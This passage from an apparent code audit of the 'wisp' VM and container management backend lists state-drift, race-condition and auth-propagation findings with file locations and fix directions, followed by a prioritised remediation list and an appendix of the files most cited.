- **Drift scenario:** `mergeNetworkLeaseIntoConfig` writes the IP once at start; `persistContainerIpFromNetnsIfMissing` only fills missing IPs. When the lease changes, mDNS A record continues to advertise the old IP forever.
- **Fix direction:** Periodic reconcile re-reads the netns IP and re-registers if changed.

#### S12. `removeMount(id)` doesn't check container references → dangling `sourceId`
- **File:** `backend/src/lib/settings.js`, `backend/src/lib/linux/containerManager/containerManagerMounts.js`
- **Drift scenario:** Containers using a removed storage mount have a dangling `sourceId`. OCI build `assertBindSourcesReady` is best-effort (`containerManagerCreate.js:547`) — silent bind of nothing or start failure.
- **Fix direction:** Block `removeMount` when any container's `container.json` references it (mirror `assertBridgeNotInUse`).

#### S13. Settings `wisp-config.json` write race — read outside the write lock
- **File:** `backend/src/lib/settings.js:226` (with `writeLock` chains at `:146,297,360,380`)
- **Drift scenario:** Two concurrent `PATCH /api/settings` calls each `readSettingsFile()` first, then queue a write. Second write overwrites the first's changes — classic read-modify-write race. Read should be inside the lock.
- **Fix direction:** Move `readSettingsFile()` inside the `writeLock = writeLock.then(...)` lambda.

#### S14. Mount auto-mount registry only converges one direction (boot unmounts strays; never retries failed configured mounts)
- **File:** `backend/src/lib/mountsAutoMount.js:48-57`
- **Drift scenario:** Configured mount with `autoMount: true` whose mount fails at boot (SMB unreachable / disk plug race) is logged and forgotten. The UI shows status per-render (good) but there's no retry timer and no indicator beyond the per-row red state.
- **Fix direction:** Periodic reconciler that re-attempts failed auto-mounts; per-row "retry" already feasible via the existing PUT path.

#### S15. JWT auth: multi-tab logout doesn't propagate; in-flight SSEs survive password change
- **File:** `frontend/src/api/client.js:1-13`, `backend/src/lib/auth.js`
- **Drift scenario 1:** Logout in tab A clears localStorage. Tab B keeps making authenticated requests with its in-memory copy until token expires (24 h).
- **Drift scenario 2:** Password change → JWT secret rotates → new requests get 401 → frontend redirects to /login. But in-flight SSE/WS connections authed pre-rotation continue serving until they reconnect.
- **Fix direction:** `window.addEventListener('storage', ...)` on the auth store. Server-side, on password change, `closeAllSSE()` + WS close.

### 3.4 Low

#### S16. Container delete: mDNS deregistered before task killed → brief "name gone, container still serving" window
- **File:** `backend/src/lib/linux/containerManager/containerManagerCreate.js:587-589`
- **Fix direction:** Move `deregisterServicesForContainer` / `deregisterAddress` to after `Tasks.delete`, or accept the cosmetic race.

#### S17. mDNS publisher: out-of-band rename via `virsh domrename` leaves stale Avahi entry
- **File:** `backend/src/lib/vmMdnsPublisher.js:30-40`
- **Drift scenario:** External rename + `localDns: true` → publisher reconciles by name, `dropTracked(oldName)` runs, but `deregisterAddress(oldName)` doesn't match the avahi entry that was published under the (sanitized) hostname. Stale entry until backend restart.
- **Fix direction:** Acceptable; document.

#### S18. `oci-image-meta.json` write race + non-atomic write
- **File:** `backend/src/lib/linux/containerManager/containerManagerImages.js:24-62,141-148`
- **Fix direction:** Atomic write (tmp + rename); single-writer mutex.

#### S19. `listBackgroundJobs` aggregates four stores — one throw blanks the union
- **File:** `backend/src/lib/listBackgroundJobs.js:9-16`
- **Fix direction:** Wrap each `listJobs()` in `try { } catch { return []; }` at aggregation time.

#### S20. Container `localDns` toggle doesn't register if container is running with no IP yet
- **File:** `backend/src/lib/linux/containerManager/containerManagerConfig.js:301-307`
- **Drift scenario:** `localDns: false → true` while CNI lease is pending. `if (... config.network?.ip)` skips registration; nothing later re-triggers.
- **Fix direction:** Periodic container mDNS reconciler (mirror `vmMdnsPublisher`), or re-register on first IP discovery.

#### S21. `vmListCache.staleBinary` may stay false after qemu upgrade if no domain event fires
- **File:** `backend/src/lib/linux/vmManager/vmManagerList.js:43-55`, `vmManagerProc.js:42-47`
- **Fix direction:** Acceptable.

#### S22. Backup manifest's `vmBasePath` is absolute; resilient but fragile if `vmsPath` config changes between backup and restore
- **File:** `backend/src/lib/linux/vmManager/vmManagerBackup.js:313-326,150-164,474`
- **Fix direction:** Acceptable; well-documented.

---

## 4. Sketchy / smell list (not graded)

These aren't bugs in the strict sense, but they're the kind of thing that becomes a bug under pressure:

- **`auth.js` reads `config/wisp-password` synchronously on every authenticated request** (`getSecret()` invoked from both `signJWT` and `verifyJWT`). Cheap today; will show in profiles under load. A simple LRU/cached secret with file-mtime invalidation removes the I/O without changing semantics.
- **`fastify-multipart` 50 GiB per-file limit with no per-IP/per-user concurrency limit.** A single misbehaving admin (or one with stolen credentials) can pin the disk.
- **No total-request-size limit**, just per-file. Many small files in one request still works.
- **`@xterm/xterm` and `@xterm/addon-fit`** — correctly using the maintained packages (good, matches WISP-RULES).
- **`backend/src/lib/listBackgroundJobs.js`** is a thin aggregator; growth pattern of "one more job kind = one more import" is OK at 4 stores, but a registry would scale better past ~6.
- **`paths.js` derives `getVMBasePath(name)` from a name that can change**. The structural fix (key by UUID) would make S1, S2, S5 disappear — worth considering even if costly.
- **`assertBridgeNotInUse`** is the right pattern; replicate it for image-library delete (S8) and storage-mount delete (S12).
- **JSON files written by the backend** (`container.json`, `wisp-config.json`, `oci-image-meta.json`) all use the same non-atomic `writeFile`. Worth a tiny shared `writeJsonAtomic(path, obj)` helper used everywhere.

---

## 5. Top-of-list fix recommendation

If only ten things get done, do these — in order — to maximize blast-radius reduction per unit work:

1. **C3** — single `preHandler` calling `validateContainerName(params.name)` for every `/containers/:name/...` route. Closes arbitrary file read + arbitrary directory delete.
2. **C1, C2** — call `validateVMName(body.name)` / `validateVMName(body.newName)` in the create and clone routes. Set `additionalProperties: false` on those bodies.
3. **C5** — constrain `mountPath` in `validateCommonFields` to `/mnt/wisp/...` (with `realpath`). Mirror in `wisp-mount`.
4. **C4** — add `realpath`/regex defense in depth in `wisp-bridge --file-name`.
5. **S3** — preserve the previous cloud-init password hash when `config.password === '***'`. Silent password downgrade is the worst kind of state-sync bug.
6. **H4** — Pino `redact: ['req.url']` (or move SSE/WS to short-lived signed nonces / cookies). Stops 24-h session replay from logs.
7. **H1, H2** — single-resolve + IP-pinned fetch + manual redirect handling for SSRF; expand private IP list.
8. **S1, S2** — VM rename renames the directory; clone copies into the new VM's directory. (Or restructure to UUID-keyed paths.)
9. **H5** — emit cloud-init YAML via a real YAML library; reject `\n`/`\r` in user-controlled fields.
10. **S6, S7** — `writeJsonAtomic` helper; on-startup partial-artifact cleanup pass.

---

## Appendix A — Files most cited

`backend/src/lib/linux/vmManager/vmManagerCreate.js` (paths, clone, delete, cdrom)
`backend/src/lib/linux/vmManager/vmManagerConfig.js` (rename, autostart)
`backend/src/lib/linux/vmManager/vmManagerSnapshots.js` (memory `@file`)
`backend/src/lib/linux/vmManager/vmManagerCloudInit.js`, `backend/src/lib/cloudInit.js` (the `***` bug)
`backend/src/lib/linux/containerManager/containerManagerConfigIo.js` (non-atomic write)
`backend/src/lib/linux/containerManager/containerManagerCreate.js` (delete order; image stale)
`backend/src/lib/jobStore.js`, `backend/src/lib/listBackgroundJobs.js` (in-memory only)
`backend/src/lib/settings.js` (write race; non-atomic; mount FK; mountPath unrestricted)
`backend/src/lib/auth.js`, `frontend/src/api/client.js` (multi-tab logout; localStorage)
`backend/src/lib/downloadFromUrl.js`, `backend/src/lib/downloadUtils.js` (SSRF)
`backend/src/routes/vms.js` (path traversal on body.name; `additionalProperties: true`)
`backend/src/routes/containers.js` (no name-validation preHandler; CD header injection; missing schemas)
`backend/src/routes/library.js` (multipart no truncated check; rename/delete unguarded)
`backend/scripts/wisp-bridge`, `backend/scripts/wisp-mount`, `backend/scripts/wisp-netns` (privileged shims)
